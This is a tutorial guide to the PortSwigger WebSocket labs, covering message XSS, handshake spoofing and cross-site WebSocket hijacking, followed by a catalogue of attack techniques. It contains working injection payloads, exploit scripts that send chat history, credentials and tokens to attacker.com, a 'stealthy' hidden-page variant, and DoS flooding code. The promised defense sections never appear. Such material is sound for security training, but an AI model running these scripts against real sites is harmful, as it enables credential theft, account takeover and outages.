# WebSockets Security - Complete PortSwigger Labs Guide

## Table of Contents
1. [Introduction to WebSockets](#introduction-to-websockets)
2. [PortSwigger Labs Overview](#portswigger-labs-overview)
3. [Lab Solutions](#lab-solutions)
4. [Attack Techniques](#attack-techniques)
5. [Burp Suite Workflows](#burp-suite-workflows)
6. [Real-World CVEs](#real-world-cves)
7. [Tools & Automation](#tools--automation)
8. [Defense & Prevention](#defense--prevention)

---

## Introduction to WebSockets

### What Are WebSockets?

WebSockets are a **bi-directional, full-duplex communication protocol** initiated over HTTP, providing persistent, long-lived connections between client and server. Unlike traditional HTTP request-response cycles, WebSocket connections remain open, allowing real-time, asynchronous data exchange in both directions without completing individual transactions.

**Key Characteristics:**
- **Persistent connections**: Once established, the connection stays open
- **Low latency**: No overhead of repeated HTTP handshakes
- **Bi-directional**: Both client and server can initiate message transmission
- **Event-driven**: Messages flow asynchronously at any time
- **Common use cases**: Live chat, real-time financial data, gaming, notifications, collaborative editing

### How WebSockets Work

#### 1. Connection Establishment

WebSocket connections begin with an **HTTP upgrade request** initiated from JavaScript:

```javascript
var ws = new WebSocket("wss://normal-website.com/chat");
```

**Client Handshake Request:**
```http
GET /chat HTTP/1.1
Host: normal-website.com
Connection: keep-alive, Upgrade
Upgrade: websocket
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2
```

**Key Headers:**
- `Connection: Upgrade` - Requests protocol upgrade
- `Upgrade: websocket` - Specifies WebSocket protocol
- `Sec-WebSocket-Version: 13` - Protocol version
- `Sec-WebSocket-Key` - Base64-encoded random value for handshake validation
- `Cookie` - Session cookies for authentication (vulnerability point)

#### 2. Server Response

**Successful Handshake (HTTP 101):**
```http
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: 0FFP+2nmNIf/h+4BP36k9uzrYGk=
```

**Key Headers:**
- `HTTP/1.1 101` - Protocol switch confirmed
- `Sec-WebSocket-Accept` - Hash of client's key (validates handshake)

#### 3. Message Exchange

Once established, messages can contain any data format. JSON is commonly used:

```json
{"user":"hacker","content":"Hello World"}
```

**JavaScript Message Handling:**
```javascript
ws.onopen = function() {
    ws.send("READY");
};

ws.onmessage = function(event) {
    console.log("Received: " + event.data);
};

ws.onerror = function(error) {
    console.log("Error: " + error);
};

ws.onclose = function() {
    console.log("Connection closed");
};
```

### Security Implications

**Key Vulnerability Areas:**
1. **Handshake Security**: Lack of CSRF tokens makes connections hijackable
2. **Message Validation**: Unvalidated input enables injection attacks (XSS, SQLi)
3. **Origin Validation**: Missing origin checks allow cross-site attacks
4. **Authentication**: Reliance on cookies without additional validation
5. **Encryption**: Unencrypted `ws://` connections expose data

**Important Note:** The `Sec-WebSocket-Key` header provides caching protection but is **NOT used for authentication or session handling**. It only validates the handshake completion.

---

## PortSwigger Labs Overview

PortSwigger Web Security Academy provides **3 hands-on WebSockets labs** covering core vulnerability types:

| Lab | Difficulty | Vulnerability Type | Key Technique |
|-----|-----------|-------------------|---------------|
| Manipulating WebSocket messages to exploit vulnerabilities | Apprentice | XSS via WebSocket | Message interception & modification |
| Manipulating the WebSocket handshake to exploit vulnerabilities | Practitioner | XSS with filter bypass | IP spoofing + obfuscation |
| Cross-site WebSocket hijacking | Practitioner | CSWSH (CSRF-like) | Malicious HTML/JS payload |

**Lab Access:** https://portswigger.net/web-security/websockets

**Prerequisites:**
- Burp Suite Community/Professional Edition
- Basic understanding of XSS and CSRF
- Familiarity with Burp Proxy and Repeater

---

## Lab Solutions

### Lab 1: Manipulating WebSocket Messages to Exploit Vulnerabilities

**Difficulty:** Apprentice (15-20 minutes)

#### Lab Description
An online shop features a live chat system built on WebSockets. Messages are viewed by support agents in real-time. Client-side HTML encoding is applied, but it can be bypassed.

#### Objective
Trigger an `alert()` popup in the support agent's browser using a WebSocket message.

#### Vulnerability Analysis
- **Vulnerability Type:** Stored XSS via WebSocket
- **Root Cause:** Server trusts client-transmitted data without validation
- **Client-side encoding:** Applied before message is sent, but can be bypassed via proxy interception
- **Attack Vector:** Inject malicious payload directly into WebSocket message

#### Step-by-Step Solution

**Step 1: Access the Live Chat**
1. Navigate to the lab environment
2. Click **"Live chat"** in the navigation
3. Send an initial test message: `Hello`

**Step 2: Observe WebSocket Traffic**
1. In Burp Suite, go to **Proxy → WebSockets history**
2. Locate your transmitted chat message
3. Note the message format (typically JSON):
```json
{"message":"Hello"}
```

**Step 3: Test HTML Encoding**
1. Send a message containing special characters: `<test>`
2. In WebSockets history, observe the captured message
3. Note that `<` becomes `&lt;` (client-side encoding)

**Step 4: Enable WebSocket Interception**
1. In Burp, go to **Proxy → Options**
2. Scroll to **WebSocket Interception Rules**
3. Ensure **"Intercept WebSocket messages"** is enabled
4. Configure to intercept **client-to-server messages**

**Step 5: Intercept and Modify Message**
1. In the chat window, type a new message: `Test message`
2. In Burp, the message will be intercepted in the **Proxy → Intercept** tab
3. Observe the raw WebSocket message:
```json
{"message":"Test message"}
```

**Step 6: Inject XSS Payload**
Replace the message content with the XSS payload:
```json
{"message":"<img src=1 onerror='alert(1)'>"}
```

4. Click **"Forward"** to send the modified message

**Step 7: Verify Exploitation**
- The `alert(1)` popup should trigger in your browser
- The support agent's browser will also receive and execute the payload
- Lab is marked as **SOLVED**

#### HTTP Requests/Responses

**Initial Handshake:**
```http
GET /chat HTTP/1.1
Host: 0a1c00f20496fc6a80f45a63007d00ca.web-security-academy.net
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
```

**WebSocket Message (Intercepted and Modified):**
```
{"message":"<img src=1 onerror='alert(1)'>"}
```

#### Burp Suite Features Used
- **WebSockets History Tab:** View all WebSocket traffic
- **Proxy Interception:** Modify messages before transmission
- **Message Editing:** Direct manipulation of WebSocket frames

#### Key Payloads

**Basic XSS Payloads:**
```html
<img src=1 onerror='alert(1)'>
<svg onload=alert(1)>
<img src=x onerror=alert(document.domain)>
<script>alert(1)</script>
```

**Cookie Theft:**
```html
<img src=x onerror='fetch("https://attacker.com?c="+document.cookie)'>
```

#### Common Mistakes & Troubleshooting

**Issue:** Alert doesn't trigger
- **Solution:** Ensure interception is enabled for client-to-server messages
- **Solution:** Check that you're modifying the raw WebSocket frame, not the input field

**Issue:** Connection closes immediately
- **Solution:** Verify JSON syntax is valid
- **Solution:** Don't include extra characters outside the JSON structure

**Issue:** Message appears encoded
- **Solution:** You're testing in the browser instead of intercepting with Burp
- **Solution:** Client-side encoding happens before transmission—bypass it with proxy

#### Real-World Application
- **Chat applications** that don't validate messages
- **Live support systems** where agents view user-submitted content
- **Collaborative tools** with real-time updates
- **Social media feeds** using WebSocket for instant updates

---

### Lab 2: Manipulating the WebSocket Handshake to Exploit Vulnerabilities

**Difficulty:** Practitioner (20-30 minutes)

#### Lab Description
An online shop features a live chat system with an **aggressive but flawed XSS filter**. When malicious content is detected, the connection is terminated and your IP address is banned. You must bypass both the filter and the IP ban.

#### Objective
Trigger an `alert()` popup in the support agent's browser using a WebSocket message, bypassing the XSS filter and IP ban.

#### Vulnerability Analysis
- **Vulnerability Type:** Stored XSS with filter bypass
- **Root Cause 1:** XSS filter uses case-sensitive pattern matching
- **Root Cause 2:** IP-based banning trusts `X-Forwarded-For` header
- **Attack Vector:** Obfuscate payload + spoof IP address

#### Step-by-Step Solution

**Step 1: Access Live Chat and Observe Behavior**
1. Click **"Live chat"** and send a message
2. In Burp Suite, go to **Proxy → WebSockets history**
3. Locate your transmitted message

**Step 2: Prepare for Testing in Repeater**
1. Right-click the WebSocket message
2. Select **"Send to Repeater"**
3. The WebSocket connection and message appear in the **Repeater** tab

**Step 3: Test Basic XSS Payload**
1. In Repeater, modify the message to:
```json
{"message":"<img src=1 onerror='alert(1)'>"}
```
2. Click **"Send"**
3. Observe the response: Connection is terminated
4. Try to send another message: **Connection fails** (IP banned)

**Step 4: Identify IP Ban Mechanism**
1. Go to **Proxy → HTTP history**
2. Find the WebSocket handshake request
3. Note that reconnection attempts fail with the same IP

**Step 5: Bypass IP Ban with X-Forwarded-For**
1. In Repeater, click the pencil icon next to the WebSocket URL
2. This opens the **handshake editor**
3. Add a new header to the handshake:
```http
X-Forwarded-For: 1.1.1.1
```
4. Click **"Connect"** to establish a new WebSocket with the spoofed IP

**Step 6: Bypass XSS Filter with Obfuscation**
The filter blocks common XSS patterns. Bypass techniques:

**Technique 1: Case Variation**
```json
{"message":"<img src=1 oNeRrOr=alert`1`>"}
```

**Technique 2: Backtick Syntax**
Instead of `alert(1)`, use `` alert`1` ``

**Technique 3: Combined Obfuscation**
```json
{"message":"<img src=1 oNeRrOr=alert`1`>"}
```

**Step 7: Send Obfuscated Payload**
1. In Repeater, with the new spoofed IP connection
2. Send the obfuscated payload:
```json
{"message":"<img src=1 oNeRrOr=alert`1`>"}
```
3. The message is accepted (no ban)
4. Alert triggers in support agent's browser
5. Lab is marked as **SOLVED**

#### HTTP Requests/Responses

**Original Handshake:**
```http
GET /chat HTTP/1.1
Host: 0a3f00f403a1a9f180e61ee500f700f2.web-security-academy.net
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: tQXhN7YzF6I1KNdILJxBBw==
```

**Modified Handshake (with IP spoofing):**
```http
GET /chat HTTP/1.1
Host: 0a3f00f403a1a9f180e61ee500f700f2.web-security-academy.net
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: tQXhN7YzF6I1KNdILJxBBw==
X-Forwarded-For: 1.1.1.1
```

**WebSocket Message (Obfuscated):**
```json
{"message":"<img src=1 oNeRrOr=alert`1`>"}
```

#### Burp Suite Features Used
- **Repeater Tool:** Test and retry WebSocket messages
- **Handshake Editor:** Modify WebSocket handshake headers
- **Connection Management:** Establish new WebSocket connections with modified headers

#### Key Payloads

**IP Spoofing Headers:**
```http
X-Forwarded-For: 1.1.1.1
X-Real-IP: 1.1.1.1
X-Originating-IP: 1.1.1.1
X-Remote-IP: 1.1.1.1
X-Client-IP: 1.1.1.1
True-Client-IP: 1.1.1.1
```

**XSS Obfuscation Techniques:**
```html
<!-- Case variation -->
<img src=1 oNeRrOr=alert(1)>
<ImG sRc=1 OnErRoR=alert(1)>

<!-- Alternative syntax -->
<img src=1 onerror=alert`1`>
<img src=1 onerror=alert(document.domain)>

<!-- Event handler variations -->
<svg OnLoAd=alert(1)>
<body OnLoAd=alert(1)>
<input OnFoCuS=alert(1) autofocus>

<!-- Encoding variations -->
<img src=1 onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">
<img src=1 onerror="\u0061\u006c\u0065\u0072\u0074(1)">
```

#### Common Mistakes & Troubleshooting

**Issue:** IP ban persists after adding X-Forwarded-For
- **Solution:** You must modify the **handshake**, not the message
- **Solution:** Click the pencil icon in Repeater to edit handshake headers
- **Solution:** Click "Connect" to establish a NEW connection

**Issue:** Filter still blocks obfuscated payload
- **Solution:** Try multiple obfuscation techniques
- **Solution:** Use backticks instead of parentheses
- **Solution:** Mix case variations: `oNeRrOr` not `onerror`

**Issue:** Can't find handshake editor in Repeater
- **Solution:** Look for the pencil icon next to the WebSocket URL
- **Solution:** In newer Burp versions, right-click the WebSocket and select "Edit handshake"

**Issue:** Message format errors
- **Solution:** Ensure JSON syntax is valid
- **Solution:** Keep the `{"message":"..."}` structure intact

#### Real-World Application
- **Bypassing WAF rules** that use case-sensitive pattern matching
- **Evading IP-based rate limiting** in chat systems
- **Exploiting trust in forwarded headers** (`X-Forwarded-For`)
- **Testing multiple obfuscation techniques** against security filters

---

### Lab 3: Cross-Site WebSocket Hijacking

**Difficulty:** Practitioner (25-35 minutes)

#### Lab Description
An online shop implements a live chat feature using WebSockets. The WebSocket handshake **lacks CSRF tokens**, making it vulnerable to cross-site hijacking. By exploiting this, you can exfiltrate the victim's chat history containing sensitive credentials.

#### Objective
Host an HTML/JavaScript payload on the exploit server that uses cross-site WebSocket hijacking to steal the victim's chat history, extract credentials, and log into their account.

#### Vulnerability Analysis
- **Vulnerability Type:** Cross-Site WebSocket Hijacking (CSWSH)
- **Root Cause:** Handshake relies solely on HTTP cookies without CSRF tokens
- **Attack Vector:** Malicious webpage establishes WebSocket connection in victim's context
- **Impact:** Bidirectional communication, sensitive data theft, session hijacking

#### Understanding CSWSH

CSWSH is analogous to **CSRF for WebSockets**. Key differences:

| Aspect | CSRF | CSWSH |
|--------|------|-------|
| **Communication** | One-way (send request) | Two-way (send & receive) |
| **Impact** | Trigger actions | Steal data + trigger actions |
| **Protection** | CSRF tokens | CSRF tokens + origin validation |
| **Detection** | Anti-CSRF tokens missing | No unpredictable values in handshake |

**Vulnerable Handshake Characteristics:**
- Relies **only on HTTP cookies** for session management
- Contains **no CSRF tokens** or unpredictable values
- Lacks **origin validation** on the server side
- Accepts connections from any origin

#### Step-by-Step Solution

**Step 1: Access Live Chat and Send Messages**
1. Click **"Live chat"**
2. Send several chat messages to populate history
3. Refresh the page to observe that previous messages are loaded
4. Send the command: `READY`
5. Observe that this retrieves past chat messages

**Step 2: Analyze WebSocket Traffic in Burp**
1. Go to **Proxy → WebSockets history**
2. Find the `READY` command and its response
3. Note that the server returns **all previous chat messages**
4. This indicates message history is retrievable

**Step 3: Examine the WebSocket Handshake**
1. Go to **Proxy → HTTP history**
2. Filter for WebSocket handshake: Look for `Upgrade: websocket`
3. Examine the handshake request:

```http
GET /chat HTTP/1.1
Host: 0a1e005f03c5a9f1802f41b700d10047.web-security-academy.net
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2
```

**Key Finding:** No CSRF tokens or unpredictable values—only the session cookie!

**Step 4: Identify WebSocket URL**
Extract the WebSocket URL from the handshake:
- **Protocol:** `wss://` (secure WebSocket)
- **Host:** Your lab ID + `.web-security-academy.net`
- **Path:** `/chat`
- **Full URL:** `wss://YOUR-LAB-ID.web-security-academy.net/chat`

**Step 5: Craft Exploit Payload**

Create HTML/JavaScript to hijack the WebSocket connection:

```html
<script>
    var ws = new WebSocket('wss://YOUR-LAB-ID.web-security-academy.net/chat');

    ws.onopen = function() {
        // Request chat history
        ws.send("READY");
    };

    ws.onmessage = function(event) {
        // Exfiltrate received messages
        fetch('https://YOUR-COLLABORATOR-URL.oastify.com', {
            method: 'POST',
            mode: 'no-cors',
            body: event.data
        });
    };
</script>
```

**Step 6: Set Up Burp Collaborator (or Exploit Server)**

**Option A: Using Burp Collaborator**
1. Go to **Burp → Burp Collaborator client**
2. Click **"Copy to clipboard"** to get your unique URL
3. Replace `YOUR-COLLABORATOR-URL` in the exploit

**Option B: Using Exploit Server's Access Log**
```html
<script>
    var ws = new WebSocket('wss://YOUR-LAB-ID.web-security-academy.net/chat');

    ws.onopen = function() {
        ws.send("READY");
    };

    ws.onmessage = function(event) {
        // Exfiltrate via img tag to exploit server
        fetch('https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?data=' + btoa(event.data), {
            method: 'GET',
            mode: 'no-cors'
        });
    };
</script>
```

**Step 7: Host Exploit on Exploit Server**
1. Go to the exploit server (link provided in lab)
2. In the **Body** section, paste your complete exploit:

```html
<script>
    var ws = new WebSocket('wss://0a1e005f03c5a9f1802f41b700d10047.web-security-academy.net/chat');

    ws.onopen = function() {
        ws.send("READY");
    };

    ws.onmessage = function(event) {
        fetch('https://YOUR-COLLABORATOR.oastify.com', {
            method: 'POST',
            mode: 'no-cors',
            body: event.data
        });
    };
</script>
```

3. Click **"Store"** to save the exploit

**Step 8: Test Exploit (Optional)**
1. Click **"View exploit"** to test in your browser
2. Check Burp Collaborator or access logs for incoming data
3. Verify that chat messages are being exfiltrated

**Step 9: Deliver Exploit to Victim**
1. Click **"Deliver exploit to victim"**
2. The victim's browser will load your malicious page
3. Your exploit hijacks their WebSocket connection
4. Chat history is exfiltrated to your server

**Step 10: Extract Credentials from Exfiltrated Data**
1. In **Burp Collaborator client**, click **"Poll now"**
2. Review the exfiltrated messages
3. Look for messages containing **username and password**

**Example Exfiltrated Message:**
```json
{"user":"carlos","content":"My password is password123"}
```

**Step 11: Log In with Stolen Credentials**
1. Go to the lab's login page
2. Enter the extracted credentials:
   - **Username:** `carlos`
   - **Password:** `password123`
3. Click **"Log in"**
4. Lab is marked as **SOLVED**

#### Complete Exploit Code

**Basic Version (Burp Collaborator):**
```html
<script>
    var ws = new WebSocket('wss://YOUR-LAB-ID.web-security-academy.net/chat');

    ws.onopen = function() {
        ws.send("READY");
    };

    ws.onmessage = function(event) {
        fetch('https://YOUR-COLLABORATOR.oastify.com', {
            method: 'POST',
            mode: 'no-cors',
            body: event.data
        });
    };
</script>
```

**Advanced Version (Multiple Exfiltration Channels):**
```html
<script>
    var ws = new WebSocket('wss://YOUR-LAB-ID.web-security-academy.net/chat');
    var messages = [];

    ws.onopen = function() {
        console.log('[+] WebSocket connection opened');
        ws.send("READY");
    };

    ws.onmessage = function(event) {
        console.log('[+] Received message: ' + event.data);
        messages.push(event.data);

        // Exfiltrate via Burp Collaborator
        fetch('https://YOUR-COLLABORATOR.oastify.com', {
            method: 'POST',
            mode: 'no-cors',
            body: event.data
        });

        // Backup exfiltration via GET request
        var img = document.createElement('img');
        img.src = 'https://YOUR-COLLABORATOR.oastify.com/?data=' + btoa(event.data);
    };

    ws.onerror = function(error) {
        console.log('[!] WebSocket error: ' + error);
    };

    ws.onclose = function() {
        console.log('[+] WebSocket connection closed');
        // Send all collected messages
        fetch('https://YOUR-COLLABORATOR.oastify.com', {
            method: 'POST',
            mode: 'no-cors',
            body: JSON.stringify(messages)
        });
    };
</script>
```

**Real-World Version (Stealthy):**
```html
<script>
    // Establish WebSocket connection to target
    var ws = new WebSocket('wss://vulnerable-app.com/chat');

    ws.onopen = function() {
        // Request chat history
        ws.send("READY");

        // Could also send commands to perform actions
        // ws.send(JSON.stringify({action: "delete", messageId: 123}));
    };

    ws.onmessage = function(event) {
        // Parse message
        var data = JSON.parse(event.data);

        // Look for sensitive information
        if (data.content && (data.content.includes('password') ||
                             data.content.includes('credential') ||
                             data.content.includes('secret'))) {
            // Exfiltrate sensitive data
            fetch('https://attacker.com/collect', {
                method: 'POST',
                mode: 'no-cors',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    user: data.user,
                    content: data.content,
                    timestamp: new Date().toISOString()
                })
            });
        }
    };
</script>

<!-- Hide visual indicators -->
<style>
    body { display: none; }
</style>
```

#### HTTP Requests/Responses

**Vulnerable WebSocket Handshake:**
```http
GET /chat HTTP/1.1
Host: 0a1e005f03c5a9f1802f41b700d10047.web-security-academy.net
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2
Origin: https://attacker-exploit-server.com
```

**Server Response (Accepts Connection):**
```http
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: 0FFP+2nmNIf/h+4BP36k9uzrYGk=
```

**WebSocket Messages:**
```
// Client sends
> READY

// Server responds with chat history
< {"user":"carlos","content":"Hello, I need help"}
< {"user":"agent","content":"How can I assist you?"}
< {"user":"carlos","content":"My password is password123"}
```

#### Burp Suite Features Used
- **WebSockets History:** Analyze WebSocket traffic
- **HTTP History:** Examine handshake requests
- **Burp Collaborator:** Receive exfiltrated data
- **Exploit Server:** Host malicious payload

#### Key Attack Variations

**1. Real-Time Message Interception:**
```javascript
ws.onmessage = function(event) {
    // Intercept ALL messages in real-time
    fetch('https://attacker.com', {
        method: 'POST',
        body: event.data
    });
};
```

**2. Active Exploitation (Perform Actions):**
```javascript
ws.onopen = function() {
    // Send commands to perform privileged actions
    ws.send(JSON.stringify({
        action: "delete_account",
        userId: "victim"
    }));
};
```

**3. Persistent Monitoring:**
```javascript
var reconnectInterval = 5000;

function connectWebSocket() {
    var ws = new WebSocket('wss://target.com/chat');

    ws.onclose = function() {
        // Automatically reconnect
        setTimeout(connectWebSocket, reconnectInterval);
    };

    ws.onmessage = function(event) {
        // Continuous data exfiltration
        fetch('https://attacker.com', {
            method: 'POST',
            body: event.data
        });
    };
}

connectWebSocket();
```

#### Common Mistakes & Troubleshooting

**Issue:** WebSocket connection fails from exploit page
- **Solution:** Ensure you're using the correct protocol (`wss://` not `ws://`)
- **Solution:** Verify the WebSocket URL includes the correct path (`/chat`)
- **Solution:** Check that cookies are being sent (same-site restrictions)

**Issue:** No data received in Collaborator
- **Solution:** Click "Poll now" in Burp Collaborator client
- **Solution:** Verify `mode: 'no-cors'` is set in fetch request
- **Solution:** Check browser console for errors (view your own exploit first)

**Issue:** Credentials not found in exfiltrated data
- **Solution:** Victim may not have sent passwords in chat yet
- **Solution:** Try sending more messages in your own session to see format
- **Solution:** Look through ALL exfiltrated messages carefully

**Issue:** Exploit server returns 404
- **Solution:** Click "Store" to save your exploit first
- **Solution:** Verify you're using the correct exploit server URL

**Issue:** Lab doesn't mark as solved after login
- **Solution:** Ensure you logged in as the victim user (usually `carlos`)
- **Solution:** Verify the credentials were correct
- **Solution:** Try re-delivering the exploit to ensure fresh data

#### Real-World Application
- **Chat applications** without CSRF protection on WebSocket handshakes
- **Real-time collaboration tools** (Google Docs-like features)
- **Financial trading platforms** with live data feeds
- **Gaming platforms** with real-time communication
- **IoT dashboards** with WebSocket-based device control
- **Admin panels** using WebSockets for notifications

**Real-World Impact:**
- **Account takeover** via credential theft
- **Privacy breach** by stealing messages/data
- **Unauthorized actions** performed in victim's context
- **Data exfiltration** from internal systems
- **Session hijacking** for persistent access

---

## Attack Techniques

### 1. Message Manipulation

**Description:** Intercepting and modifying WebSocket messages to inject malicious payloads.

**Attack Flow:**
1. Establish WebSocket connection
2. Intercept messages with proxy (Burp Suite)
3. Modify message content
4. Forward modified message
5. Observe server-side processing

**Common Injection Targets:**
- **XSS:** `<script>alert(1)</script>`
- **SQL Injection:** `' OR '1'='1`
- **Command Injection:** `; ls -la`
- **LDAP Injection:** `*)(uid=*))(|(uid=*`
- **XXE Injection:** `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>`

**Example Payloads:**

**JSON Structure:**
```json
{"message":"<img src=x onerror=alert(1)>"}
{"userId":"1' OR '1'='1","action":"getUser"}
{"command":"ping","host":"127.0.0.1; cat /etc/passwd"}
```

**Text Format:**
```
READY
<script>alert(document.domain)</script>
' OR 1=1--
```

**Binary Format (Base64):**
```
PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
```

### 2. Handshake Manipulation

**Description:** Modifying the WebSocket handshake to bypass restrictions or exploit trust in HTTP headers.

**Manipulable Headers:**

**IP Spoofing:**
```http
X-Forwarded-For: 1.1.1.1
X-Real-IP: 192.168.1.1
X-Originating-IP: 10.0.0.1
X-Remote-IP: 172.16.0.1
X-Client-IP: 8.8.8.8
True-Client-IP: 4.4.4.4
```

**Origin Bypass:**
```http
Origin: https://trusted-domain.com
Origin: null
Origin: https://sub.target.com
```

**Authentication Bypass:**
```http
X-User: admin
X-Role: administrator
Authorization: Bearer fake-token-12345
Cookie: session=admin_session_token
```

**Protocol Version Manipulation:**
```http
Sec-WebSocket-Version: 8
Sec-WebSocket-Protocol: custom-protocol
```

**Attack Scenarios:**

**1. Bypass IP-Based Rate Limiting:**
```http
GET /chat HTTP/1.1
Host: target.com
Upgrade: websocket
X-Forwarded-For: 1.1.1.1
```

**2. Exploit Origin Trust:**
```http
GET /chat HTTP/1.1
Host: target.com
Upgrade: websocket
Origin: https://trusted-partner.com
```

**3. Access Internal Endpoints:**
```http
GET /internal-chat HTTP/1.1
Host: target.com
Upgrade: websocket
X-Forwarded-For: 127.0.0.1
```

### 3. Cross-Site WebSocket Hijacking (CSWSH)

**Description:** Exploiting lack of CSRF protection to establish WebSocket connections from attacker-controlled pages.

**Vulnerability Checklist:**
- [ ] Handshake relies only on HTTP cookies
- [ ] No CSRF tokens in handshake
- [ ] No unpredictable values (nonces, state parameters)
- [ ] No origin validation on server side
- [ ] Cookies sent with `SameSite=None` or not set

**Attack Template:**
```html
<script>
    var ws = new WebSocket('wss://target.com/chat');

    ws.onopen = function() {
        // Send messages to perform actions
        ws.send(JSON.stringify({
            action: "transfer",
            to: "attacker",
            amount: 1000
        }));
    };

    ws.onmessage = function(event) {
        // Steal incoming data
        fetch('https://attacker.com/steal', {
            method: 'POST',
            body: event.data
        });
    };
</script>
```

**Advanced CSWSH Techniques:**

**1. Credential Harvesting:**
```javascript
var credentials = [];
ws.onmessage = function(event) {
    var data = event.data;
    if (data.match(/password|credential|secret|token/i)) {
        credentials.push(data);
        // Exfiltrate
        fetch('https://attacker.com/creds', {
            method: 'POST',
            body: JSON.stringify(credentials)
        });
    }
};
```

**2. Automated Command Execution:**
```javascript
var commands = [
    {action: "delete", target: "user_data"},
    {action: "transfer", to: "attacker", amount: 1000},
    {action: "addAdmin", user: "attacker"}
];

ws.onopen = function() {
    commands.forEach(function(cmd) {
        ws.send(JSON.stringify(cmd));
    });
};
```

**3. Bidirectional Exploitation:**
```javascript
// Receive commands from attacker server
fetch('https://attacker.com/commands')
    .then(response => response.json())
    .then(commands => {
        commands.forEach(cmd => ws.send(JSON.stringify(cmd)));
    });

// Send responses back
ws.onmessage = function(event) {
    fetch('https://attacker.com/responses', {
        method: 'POST',
        body: event.data
    });
};
```

### 4. Input-Based Vulnerabilities

**SQL Injection via WebSocket:**

**Vulnerable Server Code (Example):**
```python
@websocket_route('/search')
def search(ws):
    while True:
        query = ws.receive()
        # Vulnerable: Direct string concatenation
        sql = f"SELECT * FROM products WHERE name LIKE '%{query}%'"
        results = db.execute(sql)
        ws.send(json.dumps(results))
```

**Exploit Payload:**
```json
{"query":"' UNION SELECT username, password FROM users--"}
```

**XXE Injection via WebSocket:**

**Vulnerable XML Message:**
```json
{"data":"<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>"}
```

**Command Injection:**
```json
{"command":"ping","target":"127.0.0.1; whoami"}
```

**NoSQL Injection:**
```json
{"username":{"$ne":null},"password":{"$ne":null}}
```

### 5. Client-Side Attacks

**DOM XSS via WebSocket:**

**Vulnerable Client Code:**
```javascript
ws.onmessage = function(event) {
    // Vulnerable: Direct HTML insertion
    document.getElementById('chat').innerHTML += event.data;
};
```

**Exploit:**
```json
{"message":"<img src=x onerror=alert(document.cookie)>"}
```

**Prototype Pollution:**
```json
{"__proto__":{"isAdmin":true}}
```

**Open Redirect:**
```json
{"redirect":"https://evil.com"}
```

### 6. Denial of Service

**Connection Exhaustion:**
```javascript
// Open many connections
for (let i = 0; i < 10000; i++) {
    new WebSocket('wss://target.com/chat');
}
```

**Message Flood:**
```javascript
ws.onopen = function() {
    setInterval(function() {
        ws.send("A".repeat(1000000)); // Send large messages
    }, 1);
};
```

**Slowloris-Style Attack:**
```javascript
ws.onopen = function() {
    // Send data very slowly to keep connection alive
    setInterval(function() {
        ws.send(".");
    }, 60000); // Every minute
};
```

### 7. Authentication and Authorization Bypass

**Token Theft:**
```javascript
ws.onmessage = function(event) {
    var data = JSON.parse(event.data);
    if (data.token) {
        // Steal authentication token
        fetch('https://attacker.com', {
            method: 'POST',
            body: data.token
        });
    }
};
```

**Session Fixation:**
```javascript
// Force victim to use attacker-controlled session
ws.onopen = function() {
    ws.send(JSON.stringify({
        action: "setSession",
        sessionId: "attacker-controlled-session"
    }));
};
```

**Role Elevation:**
```json
{"action":"updateProfile","role":"admin"}
```

---

## Burp Suite Workflows

### 1. WebSocket Message Interception

**Setup:**
1. Open Burp Suite
2. Configure browser to use Burp proxy (127.0.0.1:8080)
3. Navigate to **Proxy → Options**
4. Scroll to **WebSocket Interception Rules**
5. Check **"Intercept WebSocket messages"**

**Configure Interception Rules:**
```
Rule 1: Intercept if URL contains: /chat
Rule 2: Intercept if message contains: password
Rule 3: Intercept client-to-server messages
Rule 4: Intercept server-to-client messages
```

**Intercept and Modify:**
1. Perform action in web application that triggers WebSocket
2. In Burp, go to **Proxy → Intercept**
3. WebSocket messages appear with **[WebSocket]** label
4. Modify the message content
5. Click **"Forward"** to send modified message
6. Click **"Drop"** to block the message

**Example Modification:**
```
Original:  {"message":"Hello"}
Modified:  {"message":"<script>alert(1)</script>"}
```

### 2. WebSocket History Analysis

**Access History:**
1. Go to **Proxy → WebSockets history**
2. View all WebSocket connections and messages
3. Filter by URL, direction, or search content

**Key Columns:**
- **#** - Message number
- **URL** - WebSocket endpoint
- **Direction** - Outbound (→) or Inbound (←)
- **Message** - Content of the WebSocket frame
- **Length** - Message size in bytes

**Analysis Techniques:**
1. **Identify patterns** in message structure
2. **Search for sensitive data** (passwords, tokens, PII)
3. **Analyze protocol logic** (command structure, authentication flow)
4. **Find injection points** (user-controlled data)

**Search Functionality:**
```
Search for: password
Search for: <script
Search for: UNION SELECT
Search for: {"user":
```

### 3. WebSocket Repeater

**Send to Repeater:**
1. In **WebSockets history**, right-click a message
2. Select **"Send to Repeater"**
3. The WebSocket connection and message appear in Repeater tab

**Repeater Interface:**
- **WebSocket URL:** Shows the connection endpoint
- **Connection Status:** Connected/Disconnected
- **Message Editor:** Modify message content
- **Send Button:** Transmit message
- **History:** Previous messages sent in this session

**Testing Workflow:**
1. **Establish connection:** Click "Connect" if needed
2. **Modify message:** Edit content in the message editor
3. **Send:** Click "Send" button
4. **Observe response:** View server response
5. **Iterate:** Modify and resend for systematic testing

